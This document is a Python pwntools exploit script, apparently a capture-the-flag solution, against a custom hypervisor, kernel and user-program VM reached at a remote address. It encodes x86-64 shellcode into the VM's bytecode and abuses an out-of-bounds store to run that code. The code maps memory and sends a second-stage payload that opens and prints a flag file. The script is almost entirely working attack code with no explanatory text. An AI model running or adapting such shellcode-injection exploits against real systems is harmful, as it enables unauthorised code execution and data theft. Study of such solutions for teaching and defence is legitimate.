from pwn import *

LOCAL = 0
DEDUG  = 0#1
VERBOSE = 0

if VERBOSE:
    context(log_level = 'debug', arch='amd64')
else:
    context(log_level = 'critical', arch='amd64')

context.terminal = ['tmux', 'splitw', '-h']

if LOCAL:
    # io = process(['./hypervisor.elf', 'kernel.bin', 'ld.so.2', './user.elf'], aslr=False)
    io = process(['./hypervisor.elf', 'kernel.bin', 'ld.so.2', './user.elf'])
    if DEDUG:
        gdb.attach(io, 'b *0x0000555555556143 if $rdx==0x1000\nb *0x0000555555555F5E\nb *0x0000555555556143 if $rdx==0x40\n')
else:
    io = remote('35.200.23.198', 31733)

def my_asm(instrcutions):
    instrcutions = filter(lambda ins: ins is not '', map(lambda ins: ins.strip(), instrcutions.split('\n')))
    bytecodes = ''
    for ins in instrcutions:
        data = ins.split(' ')
        op = data[0]
        if op == 'pushb':
            bytecodes += chr(int(data[1]) + 97)
        elif op == 'pushd':
            if data[1].startswith('0x'):
                bytecodes += str(int(data[1], 16))
            else:
                bytecodes += data[1]
        elif op == 'dup':
            bytecodes += chr(0x24)
        elif op == 'pop':
            bytecodes += chr(0x25)
        elif op == 'and':
            bytecodes += chr(0x26)
        elif op == 'mul':
            bytecodes += chr(0x2A)
        elif op == 'add':
            bytecodes += chr(0x2B)
        elif op == 'write':
            bytecodes += chr(0x2C)
        elif op == 'minus':
            bytecodes += chr(0x2D)
        elif op == 'writed':
            bytecodes += chr(0x2E)
        elif op == 'div':
            bytecodes += chr(0x2F)
        elif op == 'store':
            bytecodes += chr(0x3A)
        elif op == 'fetch':
            bytecodes += chr(0x3B)
        elif op == 'eql':
            bytecodes += chr(0x3D)
        elif op == 'gt':
            bytecodes += chr(0x3E)
        elif op == 'rot':
            bytecodes += chr(0x40)
        elif op == 'swap':
            bytecodes += chr(0x5C)
        elif op == 'neg':
            bytecodes += chr(0x5F)
        elif op == 'or':
            bytecodes += chr(0x7C)
        elif op == 'not':
            bytecodes += chr(0x7E)

    return bytecodes

def to_int(val):
    if val.startswith('-'):
        return int((1<<32) - int(val[1:]))
    else:
        return int(val)

def put_shellcode(shellcode):
    result = ''
    push_count = 0
    for i in range(0, len(shellcode), 4):
        val = u32(shellcode[i:i+4].ljust(4, '\x00'))
        result += my_asm('pushd %d\nneg\nneg' % val)
        push_count += 1
    for i in range(push_count):
        result += my_asm('pop')
    return result

def OFFSET(v, bits):
    return ((v >> bits) & 0x1ff)

def PML4OFF(v):
    return OFFSET(v, 39)

def PDPOFF(v):
    return OFFSET(v, 30)

def PDOFF(v):
    return OFFSET(v, 21)

shellcode = asm(
    '''
    mov    r9d,0x0
    mov    r8d,0xffffffffffffffff
    mov    r10d,0x0
    mov    edx,0x3
    mov    ecx, 0x10
    mov    rsi, 0x1739000
    mov    edi,0
    mov    rax,9
    syscall

    mov rsi, rax
    mov rax, 0
    mov rdi, 0
    mov rdx, 0xf000
    syscall
    '''
    )

bytecodes = my_asm('pushd %d\nneg\nneg' % 0xffffffe4)
bytecodes2 = my_asm(
    '''
    swap
    pushd %d
    add
    pushb 0
    store
    pop
    pop
    pop
    pop
    pushb 0
    fetch
    write
    ''' % (0x2018f2))
bytecodes += put_shellcode(shellcode) + bytecodes2

#print bytecodes
io.recvuntil('down.\n')
io.sendline(bytecodes)

shellcode2 = asm(
    '''
    mov rax, 0x0000003267616c66
    push rax
    mov rdi, rsp
    mov rsi, 0x8000000000
    xor rdi, rsi
    ''')

shellcode2 += '\xe8' + p32(0xcdf)

shellcode2 += asm(
    '''
    mov rsi, 0xb800
    mov rdi, rax
    mov rdx, 0x40
    ''')

shellcode2 += '\xe8' + p32(0xc0d)

shellcode2 += asm(
    '''
    mov rsi, 0xb800
    mov rdi, 1
    mov rdx, 0x40
    ''')

shellcode2 += '\xe8' + p32(0xcbb)

#raw_input()
io.send('A' * 0x17f + shellcode2)

io.interactive()
